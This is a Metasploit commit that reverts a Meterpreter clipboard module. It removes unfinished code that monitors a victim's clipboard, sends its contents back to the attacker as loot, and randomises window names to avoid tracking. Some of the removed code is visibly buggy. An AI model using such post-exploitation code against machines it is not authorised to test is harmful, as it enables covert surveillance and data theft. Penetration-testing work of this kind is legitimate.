18e1d9ce17732a4c81a9ec21cb3063d3323a2a84
OJ <oj@buffered.io>
2013-12-04 07:03:12 +1000

    Revert "Start clipboard monitor functionality"
    This reverts commit ecbdfd35026492579fd7af771b890c54526e75ce.
    
    I don't know how this got in there, as it's in another branch waiting for more work.
    My bad.

--- lib/rex/post/meterpreter/ui/console/command_dispatcher/extapi/clipboard.rb
+++ lib/rex/post/meterpreter/ui/console/command_dispatcher/extapi/clipboard.rb
@@ -5,6 +5,7 @@ module Rex
 module Post
 module Meterpreter
 module Ui
+
 ###
 #
 # Extended API window management user interface.
@@ -22,8 +23,7 @@ class Console::CommandDispatcher::Extapi::Clipboard
   def commands
     {
       "clipboard_get_data" => "Read the victim's current clipboard (text, files, images)",
-      "clipboard_set_text" => "Write text to the victim's clipboard",
-      "clipboard_monitor"  => "Interact with the clipboard monitor"
+      "clipboard_set_text" => "Write text to the victim's clipboard"
     }
   end
 
@@ -143,7 +143,7 @@ class Console::CommandDispatcher::Extapi::Clipboard
     "-h" => [ false, "Help banner" ]
   )
 
-  def print_clipboard_set_text_usage()
+  def clipboard_set_text_usage()
     print(
       "\nUsage: clipboard_set_text [-h] <text>\n\n" +
       "Set the target's clipboard to the given text value.\n\n")
@@ -158,85 +158,12 @@ class Console::CommandDispatcher::Extapi::Clipboard
     @@set_text_opts.parse(args) { |opt, idx, val|
       case opt
       when "-h"
-        print_clipboard_set_text_usage
+        clipboard_set_text_usage
         return true
       end
     }
 
     return client.extapi.clipboard.set_text(args.join(" "))
-  end
-
-  #
-  # Options for the clipboard_get_data command.
-  #
-  @@monitor_opts = Rex::Parser::Arguments.new(
-    "-h" => [ false, "Help banner" ],
-    "-i" => [ false, "Automatically download image content" ],
-    "-f" => [ false, "Automatically download files" ],
-    "-l" => [ true,  "Specifies the folder to write the clipboard loot to" ]
-  )
-
-  def print_clipboard_monitor_usage()
-    print(
-      "\nUsage: clipboard_monitor <start|pause|resume|stop> [-f] [-i] [-h]\n\n" +
-      "Starts or stops a background clipboard monitoring thread. The thread watches\n" +
-      "the clipboard on the target, under the context of the current desktop, and when\n" +
-      "changes are detected the contents of the clipboard are returned to the attacker.\n\n" +
-      "  - start  - starts the clipboard monitor with the given arguments if\n" +
-      "             the thread is not already running.\n" +
-      "  - pause  - pauses a currently running clipboard monitor thread.\n" +
-      "  - resume - resumes a currently paused clipboard monitor thread.\n" +
-      "  - stop   - stops a currently running or paused clipboard monitor thread.\n" +
-      @@monitor_opts.usage + "\n")
-  end
-
-  def cmd_clipboard_monitor(*args)
-    args.unshift "-h" if args.length == 0
-    download_files = false
-    download_images = false
-    loot_dir = nil
-
-    @@set_text_opts.parse(args) { |opt, idx, val|
-      case opt
-      when "-f"
-        download_files = true
-      when "-i"
-        download_images = true
-      when "-l"
-        loot_dir = val
-      when "-h"
-        print_clipboard_monitor_usage
-        return true
-      end
-    }
-
-    case args.shift
-    when "start"
-      loot_dir = generate_loot_dir(true) unless loot_dir
-      print_status("Clipboard monitor looting to #{loot_dir} ...")
-      print_status("Download files? #{download_files ? "Yes" : "No"}")
-      print_status("Download images? #{download_images ? "Yes" : "No"}")
-
-      client.extapi.clipboard.monitor_start({
-        # random class and window name so that it isn't easy
-        # to track via a script
-        :wincls  => Rex::Text.rand_text_alpha(8),
-        :loot    => loot_dir,
-        :files   => download_files,
-        :iamges  => download_images
-      })
-      print_good("Clipboard monitor started")
-    when "pause"
-      client.extapi.clipboard.monitor_pause
-      print_good("Clipboard monitor paused")
-    when "resume"
-      client.extapi.clipboard.monitor_resume
-      print_good("Clipboard monitor resumed")
-    when "stop"
-      client.extapi.clipboard.monitor_stop
-      print_good("Clipboard monitor stopped")
-    end
-
   end
 
 protected
